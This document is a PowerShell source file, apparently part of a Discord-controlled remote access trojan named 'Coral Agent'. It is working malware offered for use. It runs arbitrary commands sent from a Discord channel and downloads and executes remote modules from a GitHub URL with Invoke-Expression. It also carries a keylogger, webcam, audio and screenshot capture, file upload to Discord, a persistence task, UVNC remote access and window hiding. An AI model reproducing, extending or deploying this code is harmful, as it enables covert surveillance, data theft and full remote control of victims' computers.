    $msg = "**Active Jobs:**`n"
    foreach ($job in $jobList) {
        $msg += "**$($job.JobName)** (ID: $($job.JobId)) - Status: $($job.Status)`n"
    }
    sendMsg -Message $msg
}

function Remove_AgentJob {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        try {
            Stop-Job -Job $job -Force
        } catch {}
        Remove-Job -Job $job -Force
        $script:Jobs.Remove($JobName)
        sendMsg -Message " **Job Removed:** ``$JobName``"
    } else {
        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
    }
}

function Get_AgentJobOutput {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        $output = Receive-Job -Job $job -Keep -ErrorAction SilentlyContinue
        
        $errors = @()
        foreach ($childJob in $job.ChildJobs) {
            if ($childJob.Error.Count -gt 0) {
                $errors += $childJob.Error | ForEach-Object { $_.Exception.Message }
            }
        }
        
        $msg = ":page_facing_up: **Job Output - $JobName :**`n"
        
        if ($output) {
            $result = $output | Out-String
            if ($result.Length -gt 1500) {
                $result = $result.Substring(0, 1500) + "... (truncated)"
            }
            $msg += "**Output:**```$result```""
        } else {
            $msg += "**Output:** No output available`n"
        }
        
        if ($errors.Count -gt 0) {
            $errorText = $errors -join "`n"
            if ($errorText.Length -gt 500) {
                $errorText = $errorText.Substring(0, 500) + "... (truncated)"
            }
            $msg += "`n**Errors:**```$errorText```""
        } else {
            $msg += "`n**Errors:** No errors```""
        }
        
        sendMsg -Message $msg
    } else {
        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
    }
}

function Get_AgentJobStatus {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        
        $msg = ":gear: **Job Status - $JobName :**`n"
        $msg += "**State:** $($job.State)`n"
        $msg += "**Has More Data:** $($job.HasMoreData)`n"
        $msg += "**Start Time:** $($job.PSBeginTime)`n"
        $msg += "**End Time:** $($job.PSEndTime)`n"
        
        if ($job.State -eq "Failed") {
            $failureReason = $job.ChildJobs[0].JobStateInfo.Reason
            if ($failureReason) {
                $msg += "**Failure Reason:** $($failureReason.Message)`n"
            }
        }
        
        $errorCount = ($job.ChildJobs | ForEach-Object { $_.Error.Count } | Measure-Object -Sum).Sum
        $msg += "**Error Count:** $errorCount"
        
        sendMsg -Message $msg
    } else {
        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
    }
}

function Stop_AllAgentJobs {
    if ($script:Jobs.Count -eq 0) {
        sendMsg -Message ":information_source: **No jobs to stop**"
        return
    }
    
    $stoppedCount = 0
    foreach ($JobName in @($script:Jobs.Keys)) {
        try {
            $job = $script:Jobs[$JobName]
            Stop-Job -Job $job -Force
            Remove-Job -Job $job -Force
            $script:Jobs.Remove($JobName)
            $stoppedCount++
        } catch {}
    }
    sendMsg -Message ":stop_sign: **Stopped $stoppedCount job(s)**"
}

function Check_CompletedJobs {
    foreach ($JobName in @($script:Jobs.Keys)) {
        if (Get_AgentJobCompleted -JobName $JobName) {
            $job = $script:Jobs[$JobName]
            $output = Receive-Job -Job $job -ErrorAction SilentlyContinue
            $errors = ($job.ChildJobs | ForEach-Object { $_.JobStateInfo.Reason }) -join "`n"
            Remove-Job -Job $job
            $script:Jobs.Remove($JobName)
            
            $msg = ":checkered_flag: **Job Completed - $JobName**"
            if ($output) {
                $result = $output | Out-String
                if ($result.Length -gt 1600) {
                    $result = $result.Substring(0, 1600) + "... (truncated)"
                }
                $msg += "```$result```""
            }
            if ($errors) { 
                $msg += "`n:warning: **Errors:**`n```$errors```""
            }
            sendMsg -Message $msg
        }
    }
}

# =============================== UVNC FUNCTIONS (R)===============================
#ENABLEUVNC
#DISABLEUVNC
# =============================== DISCORD (R) =============== 
#ENABLENEKO
#REMOVENEKO
# =============================== SCRIPT MANAGEMENT ===============================

function Check_ScriptAlreadyRunning {
    param([bool]$UseDiscord = $false)
    
    try {
        $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
        $mutex = $null
        
        try {
            $mutex = [System.Threading.Mutex]::new($false, $mutexName)
            
            if (-not $mutex.WaitOne(100)) {
                if ($UseDiscord) {
                    sendMsg -Message ":warning: **Another instance of Coral Agent is already running!**"
                    sendMsg -Message ":no_entry: **This instance will now exit to prevent conflicts**"
                } else {
                    
                }
                [Environment]::Exit(1)
            }
            
            $global:CoralMutex = $mutex
            
        } catch [System.Threading.AbandonedMutexException] {
            if ($UseDiscord) {
                sendMsg -Message ":warning: **Previous instance didn't exit cleanly, taking over...**"
            } else {
                #Write-Host "Previous instance didn't exit cleanly, taking over..."
            }
        }
    } catch {
        if ($UseDiscord) {
            sendMsg -Message ":warning: **Error during process check:** $($_.Exception.Message)"
        } else {
            #Write-Host "Error during process check: $($_.Exception.Message)"
        }
    }
}

function Cleanup_CoralAgent {
    try {
        if ($global:CoralMutex) {
            $global:CoralMutex.ReleaseMutex()
            $global:CoralMutex.Dispose()
        }
        if ($script:Jobs.Count -gt 0) { Stop_AllAgentJobs }
        if ($global:keyloggerstatus) { Stop_Keylogger }
    } catch {}
}


trap { try { Cleanup_CoralAgent } catch {}; continue }


# =============================== PERSISTENCE ( R )=============================
#ENABLEPTASK
#DISABLEPTASK

# =============================== MODULES (WIP) ===============================
$global:ModuleRegistry = @{
    # Core modules (always available)
    core = @{
        name = "Core Functions"
        functions = @("sendMsg", "sendFile", "GetCurrentTheme", "SetCurrentTheme")
        loaded = $true
        required = $true
    }
    
    # Remote modules
    recon = @{
        name = "Reconnaissance Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/recon/"
        scripts = @{
            SCREENSHOT = @{
                url = "Mscreenshot_all.ps1"
                function = "Mscreenshot"
                alias = "SCREENSHOT"
                description = "Take screenshots of all monitors"
                params = @("monitor")
            }
            WEBCAM = @{
                url = "Mwebcam.ps1"
                function = "Mwebcam"
                alias = "WEBCAM"
                description = "Record webcam video"
                params = @("duration", "quality")
            }
            AUDIO = @{
                url = "Maudio.ps1"
                function = "Maudio"
                alias = "AUDIO"
                description = "Record audio"
                params = @("duration")
            }
            QUICKINFO = @{
                url = "MquickInfo.ps1"
                function = "MquickInfo"
                alias = "QUICKINFO"
                description = "Get system information"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
    
    persistence = @{
        name = "Persistence Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/persistence/"
        scripts = @{
            ENABLEPTASK = @{
                url = "Mregptask.ps1"
                function = "Mcreate_Ptask"
                alias = "ENABLEPTASK"
                description = "Create persistence task"
                params = @("token")
            }
            DISABLEPTASK = @{
                url = "Mregptask.ps1"
                function = "Mremove_Ptask"
                alias = "DISABLEPTASK"
                description = "Remove persistence task"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
    
    KEYLOGGER = @{
        name = "Keylogger Module"
        functions = @("Start_Keylogger", "Stop_Keylogger", "Get_KeyloggerStatus")
        loaded = $true
        required = $false
    }
    
    NEKOUVNC = @{
        name = "UVNC Remote Access"
        functions = @("StartUvnc", "RemoveUVNC")
        loaded = $true
        required = $false
    }

    NEKOS = @{
        name = "Neko Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/nekos/"
        scripts = @{
            ENABLENEKOGRABBER = @{
                url = "Mnekograbber.ps1"
                function = "Mgetneko"
                alias = "ENABLENEKOGRABBER"
                description = "Download neko executable"
                params = @()
            }
            DISABLENEKOGRABBER = @{
                url = "Mnekograbber.ps1"
                function = "Mremoveneko"
                alias = "DISABLENEKOGRABBER"
                description = "Remove neko executable"
                params = @()
            }
            ENABLENEKOUVNC =@{
                url = "MnekoUVNC.ps1"
                function = "MStartUvnc"
                alias = "ENABLENEKOUVNC"
                description = "Start UVNC server"
                params = @("ip", "port")
            }
            DISABLENEKOUVNC =@{
                url = "MnekoUVNC.ps1"
                function = "MRemoveUVNC"
                alias = "DISABLENEKOUVNC"
                description = "Remove UVNC server"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
}
function Is_LocalFunction {
    param([string]$FunctionName)
    
    # Check if function exists locally
    return (Get-Command $FunctionName -ErrorAction SilentlyContinue) -ne $null
}

function List_Modules {
    $msg = ":package: **Available Modules:**`n`n"
    
    foreach ($moduleName in $global:ModuleRegistry.Keys) {
        $module = $global:ModuleRegistry[$moduleName]
        $status = if ($module.loaded) { ":green_circle: Loaded" } else { ":red_circle: Not Loaded" }
        $required = if ($module.required) { " (Required)" } else { "" }
        
        $msg += "**$($module.name)** ``$moduleName``$required - $status`n"
        
        if ($module.ContainsKey("scripts")) {
            foreach ($scriptName in $module.scripts.Keys) {
                $script = $module.scripts[$scriptName]
                $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join ", ") + "]" } else { "" }
                $msg += "  • **$($script.alias)**$params - $($script.description)`n"
            }
        } elseif ($module.ContainsKey("functions")) {
            foreach ($func in $module.functions) {
                $msg += "  • **$func**`n"
            }
        }
        $msg += "`n"
    }
    
    sendEmbedWithImage -Title "Available Modules" -Description $msg 
}

function Get_AvailableCommands {
    $commands = @()
    
    foreach ($moduleName in $global:ModuleRegistry.Keys) {
        $module = $global:ModuleRegistry[$moduleName]
        
        if ($module.ContainsKey("scripts")) {
            foreach ($scriptName in $module.scripts.Keys) {
                $script = $module.scripts[$scriptName]
                $status = if ($module.loaded) { ":green_circle:" } else { ":red_circle:" }
                $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join " ") + "]" } else { "" }
                $commands += "**$($script.alias.ToUpper())**$params $status - $($script.description) *(Module: $moduleName)*"
            }
        } elseif ($module.ContainsKey("functions")) {
            foreach ($func in $module.functions) {
                $status = if ($module.loaded) { ":green_circle:" } else { ":red_circle:" }
                $commands += "**$($func.ToUpper())** $status *(Module: $moduleName)*"
            }
        }
    }
    
    if ($commands.Count -eq 0) {
        sendMsg -Message ":information_source: **No commands available in registry**"
        return
    }
    
    $msg = ":gear: **Available Commands:**`n`n" + ($commands -join "`n")
    sendMsg -Message $msg
}

function Execute_Command {
    param([string]$Command)
    
    $commandLower = $Command.ToLower()
    
    # Check if it's a local function first
    if (Is_LocalFunction -FunctionName $commandLower) {
        try {
            & $commandLower
            return $true
        } catch {
            sendMsg -Message ":x: **Error executing local function:** ``$commandLower`` - $($_.Exception.Message)"
            return $false
        }
    }
    
    # Check if it's a remote function in the registry
    foreach ($moduleName in $global:ModuleRegistry.Keys) {
        $module = $global:ModuleRegistry[$moduleName]
        
        if ($module.ContainsKey("scripts")) {
            foreach ($scriptName in $module.scripts.Keys) {
                $script = $module.scripts[$scriptName]
                
                if ($script.alias.ToLower() -eq $commandLower) {
                    try {
                        sendMsg -Message ":gear: **Loading remote function:** ``$($script.alias)`` **from module:** ``$moduleName``"
                        
                        # Download and execute the remote script
                        $fullUrl = $module.baseUrl + $script.url
                        $scriptContent = Invoke-RestMethod $fullUrl
                        Invoke-Expression $scriptContent
                        
                        # Mark module as loaded
                        $global:ModuleRegistry[$moduleName].loaded = $true
                        
                        # Execute the function
                        & $script.function
                        return $true
                        
                    } catch {
                        sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
                        return $false
                    }
                }
            }
        }
    }
    
    return $false
}

function Find_CommandInRegistry {
    param([string]$Command)
    
    $commandUpper = $Command.ToUpper()
    $commandLower = $Command.ToLower()
    
    # Search through all modules for the command
    foreach ($moduleName in $global:ModuleRegistry.Keys) {
        $module = $global:ModuleRegistry[$moduleName]
        
        if ($module.ContainsKey("scripts")) {
            foreach ($scriptName in $module.scripts.Keys) {
                $script = $module.scripts[$scriptName]
                
                # Check if command matches the script key (exact uppercase match)
                if ($scriptName -eq $commandUpper) {
                    return @{
                        Found = $true
                        ModuleName = $moduleName
                        Script = $script
                        ScriptName = $scriptName
                        IsRemote = $true
                    }
                }
                
                # Check if command matches the alias (case insensitive)
                if ($script.alias.ToLower() -eq $commandLower) {
                    return @{
                        Found = $true
                        ModuleName = $moduleName
                        Script = $script
                        ScriptName = $scriptName
                        IsRemote = $true
                    }
                }
            }
        }
        
        # Check local functions in module
        if ($module.ContainsKey("functions")) {
            foreach ($funcName in $module.functions) {
                if ($funcName.ToLower() -eq $commandLower) {
                    return @{
                        Found = $true
                        ModuleName = $moduleName
                        FunctionName = $funcName
                        IsRemote = $false
                    }
                }
            }
        }
    }
    
    return @{ Found = $false }
}

function Execute_DynamicCommand {
    param([string]$Command)
    
    # First check if it's already a local function
    if (Get-Command $Command -ErrorAction SilentlyContinue) {
        try {
            & $Command
            return $true
        } catch {
            sendMsg -Message ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
            return $false
        }
    }
    
    # Search in module registry
    $commandInfo = Find_CommandInRegistry -Command $Command
    
    if (-not $commandInfo.Found) {
        return $false
    }
    
    if ($commandInfo.IsRemote) {
        # Handle remote function
        $module = $global:ModuleRegistry[$commandInfo.ModuleName]
        $script = $commandInfo.Script
        
        try {
            sendMsg -Message ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
            
            # Download and execute the remote script
            $fullUrl = $module.baseUrl + $script.url
            $scriptContent = Invoke-RestMethod $fullUrl
            Invoke-Expression $scriptContent
            
            # Mark module as loaded
            $global:ModuleRegistry[$commandInfo.ModuleName].loaded = $true
            
            # Execute the function
            & $script.function
            return $true
            
        } catch {
            sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
            return $false
        }
    } else {
        # Handle local function from registry
        try {
            & $commandInfo.FunctionName
            return $true
        } catch {
            sendMsg -Message ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
            return $false
        }
    }
}

function Parse_CommandWithParameters {
    param([string]$FullCommand)
    
    # Handle simple command (no parameters)
    if ($FullCommand -notmatch '\s') {
        return @{
            Command = $FullCommand
            Parameters = @{}
        }
    }
    
    # Split command and parameters
    $parts = $FullCommand -split '\s+', 2
    $command = $parts[0]
    $paramString = if ($parts.Length -gt 1) { $parts[1] } else { "" }
    
    # Parse parameters - support both positional and named parameters
    $parameters = @{}
    if ($paramString) {
        # Check if using named parameters (-param value format)
        if ($paramString -match '-\w+') {
            # Named parameter parsing
            $regex = '-(\w+)\s+([^\-]+?)(?=\s+-\w+|$)'
            $matches = [regex]::Matches($paramString, $regex)
            foreach ($match in $matches) {
                $paramName = $match.Groups[1].Value.Trim()
                $paramValue = $match.Groups[2].Value.Trim()
                $parameters[$paramName] = $paramValue
            }
        } else {
            # Positional parameter parsing - split by spaces, handle quotes
            $paramList = @()
            if ($paramString -match '".*"' -or $paramString -match "'.*'") {
                # Advanced parsing for quoted strings
                $regex = '(?:"([^"]*)"|''([^'']*)''|(\S+))'
                $matches = [regex]::Matches($paramString, $regex)
                foreach ($match in $matches) {
                    if ($match.Groups[1].Success) {
                        $paramList += $match.Groups[1].Value
                    } elseif ($match.Groups[2].Success) {
                        $paramList += $match.Groups[2].Value
                    } else {
                        $paramList += $match.Groups[3].Value
                    }
                }
            } else {
                # Simple space-separated
                $paramList = $paramString -split '\s+'
            }
            
            # Convert positional to hashtable based on function definition
            $commandInfo = Find_CommandInRegistry -Command $command
            if ($commandInfo.Found -and $commandInfo.IsRemote -and $commandInfo.Script.params) {
                for ($i = 0; $i -lt [Math]::Min($paramList.Count, $commandInfo.Script.params.Count); $i++) {
                    $parameters[$commandInfo.Script.params[$i]] = $paramList[$i]
                }
            } else {
                # If no parameter definition found, use generic names
                for ($i = 0; $i -lt $paramList.Count; $i++) {
                    $parameters["param$i"] = $paramList[$i]
                }
            }
        }
    }
    
    return @{
        Command = $command
        Parameters = $parameters
    }
}

function Execute_DynamicCommandWithParams {
    param([string]$Command, [hashtable]$Parameters = @{})
    
    # First check if it's already a local function
    if (Get-Command $Command -ErrorAction SilentlyContinue) {
        try {
            if ($Parameters.Count -gt 0) {
                & $Command @Parameters
            } else {
                & $Command
            }
            return $true
        } catch {
            sendMsg -Message ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
            return $false
        }
    }
    
    # Search in module registry
    $commandInfo = Find_CommandInRegistry -Command $Command
    
    if (-not $commandInfo.Found) {
        return $false
    }
    
    if ($commandInfo.IsRemote) {
        # Handle remote function
        $module = $global:ModuleRegistry[$commandInfo.ModuleName]
        $script = $commandInfo.Script
        
        try {
            sendMsg -Message ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
            
            # Download and execute the remote script
            $fullUrl = $module.baseUrl + $script.url
            $scriptContent = Invoke-RestMethod $fullUrl
            Invoke-Expression $scriptContent
            
            # Mark module as loaded
            $global:ModuleRegistry[$commandInfo.ModuleName].loaded = $true
            
            # Execute the function with parameters
            if ($Parameters.Count -gt 0) {
                # Special handling for specific functions that need global variables
                if ($script.function -eq "Mcreate_Ptask" -and -not $Parameters.ContainsKey("token")) {
                    $Parameters["token"] = $global:token
                }
                
                & $script.function @Parameters
                
                # Display parameter info
                $paramInfo = ($Parameters.GetEnumerator() | ForEach-Object { "$($_.Key): $($_.Value)" }) -join ", "
                sendMsg -Message ":gear: **Executed with parameters:** ``$paramInfo``"
            } else {
                & $script.function
            }
            return $true
            
        } catch {
            sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
            return $false
        }
    } else {
        # Handle local function from registry
        try {
            if ($Parameters.Count -gt 0) {
                & $commandInfo.FunctionName @Parameters
            } else {
                & $commandInfo.FunctionName
            }
            return $true
        } catch {
            sendMsg -Message ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
            return $false
        }
    }
}

function Get_FunctionHelp {
    param([string]$FunctionName)
    
    $commandInfo = Find_CommandInRegistry -Command $FunctionName
    
    if (-not $commandInfo.Found) {
        sendMsg -Message ":x: **Function not found:** ``$FunctionName``"
        return
    }
    
    if ($commandInfo.IsRemote) {
        $script = $commandInfo.Script
        $msg = ":information_source: **Function Help: $($script.alias.ToUpper())**`n"
        $msg += "**Description:** $($script.description)`n"
        $msg += "**Module:** $($commandInfo.ModuleName)`n"
        
        if ($script.params.Count -gt 0) {
            $msg += "**Parameters:** " + ($script.params -join ", ") + "`n"
            $msg += "`n**Usage Examples:**`n"
            $msg += "• ``$($script.alias.ToUpper()) " + ($script.params -join " <value> ") + " <value>`` (positional)`n"
            $msg += "• ``$($script.alias.ToUpper()) " + ($script.params | ForEach-Object { "-$_ <value>" }) -join " " + "`` (named)"
        } else {
            $msg += "**Parameters:** None`n"
            $msg += "**Usage:** ``$($script.alias.ToUpper())``"
        }
        
        sendMsg -Message $msg
    } else {
        sendMsg -Message ":information_source: **Local function:** ``$($commandInfo.FunctionName)`` - No parameter info available"
    }
}
# =============================== HELP MENU ( R )===============================
function display_help {
    $message = "
:robot: **Coral Agent Help Menu - Dynamic Module System:**

**Basic Commands:**
- **TEST:** Test the connection to the Coral Network
- **HELP:** Display this help menu
- **HELP <function>:** Get detailed help for a specific function
- **EXIT:** Disconnect from the Coral Network

**Module Management:**
- **MODULES:** List all available modules and their status
- **COMMANDS:** List all available functions from loaded modules

**Job Management:**
- **JOBS:** List all active jobs with their status
- **CREATEJOB <command>:** Create a new background job
- **DELETEJOB <jobname>:** Stop and remove a specific job
- **JOBOUTPUT <jobname>:** Get output and errors from a job
- **JOBSTATUS <jobname>:** Get detailed status of a job
- **STOPALLJOBS:** Stop all running jobs

**Theme System:**
- **GETTHEME:** Show current theme status and details
- **SETTHEME <name>:** Set theme (darktheme, neko_maid, neko_kimono, neko_cafe)
- **ENABLETHEME:** Enable theme functionality
- **DISABLETHEME:** Disable theme functionality

**Keylogger Commands:**
- **STARTKEYLOG:** Start keylogger with default 30-second intervals
- **STARTKEYLOG <seconds>:** Start keylogger with custom interval (1-300 seconds)
- **STOPKEYLOG:** Stop the keylogger
- **KEYLOGSTATUS:** Check keylogger status

**File Operations:**
- **SENDFILE <filepath>:** Upload a file to Discord
- **DOWNLOADFILE [path]:** Download file attachments from Discord

**Parameter Usage Examples:**
**Positional:** ``SETTHEME neko_maid`` ``STARTKEYLOG 60``
**Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT``

**Job Examples:**
- ``CREATEJOB SCREENSHOT``
- ``CREATEJOB WEBCAM 10 high``
- ``CREATEJOB Get-Process``

:information_source: **Use** ``MODULES`` **to see all available modules**
:gear: **Use** ``COMMANDS`` **to see all dynamic functions with parameters**
:question: **Use** ``HELP <function>`` **for detailed function help**

**Note:** Dynamic functions (SCREENSHOT, WEBCAM, AUDIO, etc.) are loaded automatically when called!
"
    sendEmbedWithImage -Title "Coral Agent Help Menu" -Description $message
}
# =============================== INITIALIZATION ===============================
try {
    $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
    $global:CoralMutex = [System.Threading.Mutex]::new($false, $mutexName)
    if (-not $global:CoralMutex.WaitOne(100)) { [Environment]::Exit(1) }
} catch [System.Threading.AbandonedMutexException] {} catch {}

try { $global:botId = Get_BotUserId } catch { exit 1 }

try {
    if (!(CheckCategoryExists)) {
        NewChannelCategory
        NewChannel -name 'coral-control'
        $global:SessionID = $ChannelID
    } else {
        $global:SessionID = $ChannelID
    }
} catch { exit 1 }

if ($global:hidewindow) { try { HideWindow } catch {} }
try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You are now connected to the Coral Network." } catch { exit 1 }

# =============================== MAIN LOOP ===============================
while ($true) {
    $latestMessage = PullMsg
    
    if ($latestMessage -and $latestMessage -ne $previousMessage) {
        $previousMessage = $latestMessage
        
        # Parse command and parameters
        $parsed = Parse_CommandWithParameters -FullCommand $latestMessage
        $command = $parsed.Command.ToUpper()
        $parameters = $parsed.Parameters
        
        switch ($command) {
            'TEST' { sendMsg -Message "Test successful from $env:COMPUTERNAME" }
            'HELP' { 
                if ($parameters.Count -gt 0 -and $parameters.ContainsKey("param0")) {
                    Get_FunctionHelp -FunctionName $parameters["param0"]
                } else {
                    display_help 
                }
            }
            'MODULES' { List_Modules }
            'COMMANDS' { Get_AvailableCommands }
            'GETTHEME' { GetCurrentTheme }
            'ENABLETHEME' { EnableTheme }
            'DISABLETHEME' { DisableTheme }
            'STARTKEYLOG' { 
                if ($parameters.ContainsKey("param0") -and $parameters["param0"] -match '^\d+$') {
                    $interval = [int]$parameters["param0"]
                    if ($interval -ge 1 -and $interval -le 300) {
                        Start_Keylogger -intervalSeconds $interval
                    } else {
                        sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
                    }
                } else {
                    Start_Keylogger
                }
            }
            'STOPKEYLOG' { Stop_Keylogger }
            'KEYLOGSTATUS' { Get_KeyloggerStatus }
            'JOBS' { List_AgentJobs }
            'STOPALLJOBS' { Stop_AllAgentJobs }
            'EXIT' { 
                sendMsg -Message "**$env:COMPUTERNAME disconnecting from Coral Network**"
                Stop_AllAgentJobs
                RemoveFfmpeg
                Execute_DynamicCommandWithParams -Command "DISABLENEKOUVNC"
                Cleanup_CoralAgent
                exit 
            }
            
            default {
                if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    SetCurrentTheme -themename $themeName
                }
                elseif ($command -eq "CREATEJOB" -and ($parameters.ContainsKey("param0") -or $parameters.Count -gt 0)) {
                    $scriptBlock = if ($parameters.ContainsKey("param0")) { $parameters["param0"] } else { 
                        ($parameters.Values -join " ") 
                    }
                    Start_AgentJob -ScriptString $scriptBlock
                }
                elseif ($command -eq "DELETEJOB" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Remove_AgentJob -JobName $jobName
                }
                elseif ($command -eq "JOBOUTPUT" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Get_AgentJobOutput -JobName $jobName
                }
                elseif ($command -eq "JOBSTATUS" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Get_AgentJobStatus -JobName $jobName
                }
                elseif ($command -eq "SENDFILE" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("path"))) {
                    $filePath = if ($parameters.ContainsKey("path")) { $parameters["path"] } else { $parameters["param0"] }
                    if (Test-Path $filePath) {
                        sendFile -sendfilePath $filePath
                    } else {
                        sendMsg -Message ":x: **File not found:** ``$filePath``"
                    }
                }
                elseif ($command -eq "DOWNLOADFILE") {
                    $downloadPath = if ($parameters.ContainsKey("path")) { $parameters["path"] } 
                                   elseif ($parameters.ContainsKey("param0")) { $parameters["param0"] } 
                                   else { $env:TEMP }
                    
                    if ($global:lastMessageAttachments -and $global:lastMessageAttachments.Count -gt 0) {
                        sendMsg -Message ":inbox_tray: **Starting download of $($global:lastMessageAttachments.Count) file(s)...**"
                        
                        foreach ($attachment in $global:lastMessageAttachments) {
                            $fileName = $attachment.filename
                            $fileUrl = $attachment.url
                            $fileSize = [math]::Round($attachment.size / 1KB, 2)
                            
                            sendMsg -Message ":arrow_down: **Downloading:** ``$fileName`` (${fileSize} KB)"
                            downloadFile -attachmentUrl $fileUrl -fileName $fileName -downloadPath $downloadPath
                        }
                    } else {
                        sendMsg -Message ":x: **No file attachments found in the message**"
                        sendMsg -Message ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
                    }
                }
                else {
                    # Try to execute as a dynamic command from the registry with parameters
                    $commandExecuted = Execute_DynamicCommandWithParams -Command $command -Parameters $parameters
                    
                    if (-not $commandExecuted) {
                        # Fall back to PowerShell expression evaluation
                        try {
                            $result = Invoke-Expression $latestMessage 2>&1
                            if ($result) {
                                $output = $result | Out-String
                                sendMsg -Message "``````$output``````"
                            } else {
                                sendMsg -Message "**Command executed successfully (no output)**"
                            }
                        } catch {
                            $errorMsg = $_.Exception.Message
                            if ($errorMsg.Length -gt 1000) {
                                $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                            }
                            sendMsg -Message ":x: ``Error: $errorMsg`` :x:"
                        }
                    }
                }
            }
        }
        Check_CompletedJobs
    }
    Start-Sleep -Seconds 3
}